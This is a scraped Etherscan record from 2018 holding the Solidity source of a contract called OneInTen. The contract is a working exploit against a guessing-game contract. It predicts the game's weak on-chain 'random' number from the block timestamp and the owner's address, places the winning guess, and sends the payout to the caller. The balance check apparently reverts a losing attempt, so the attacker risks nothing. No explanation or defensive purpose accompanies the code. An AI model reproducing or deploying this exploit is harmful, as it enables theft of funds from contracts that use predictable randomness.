//token_name	
//token_url	https://etherscan.io//address/0x64bb42f7012cbfef9e036dd8929cbc9d61c7c3ca#code
//spider_time	2018/07/08 12:33:16
//token_Transactions	3 txns
//token_price	

pragma solidity ^0.4.20;

contract LuckyNumber {
  function takeAGuess(uint8 _myGuess) public payable {}
}

contract OneInTen {
  function call_lucky(address contract_address, address contract_owner) public payable {
    uint8 guess = uint8(keccak256(now, contract_owner)) % 10;
    LuckyNumber(contract_address).takeAGuess.value(msg.value)(guess);
    require(this.balance > 0);
    msg.sender.transfer(this.balance);
  }
  
  function() payable external {
  }
}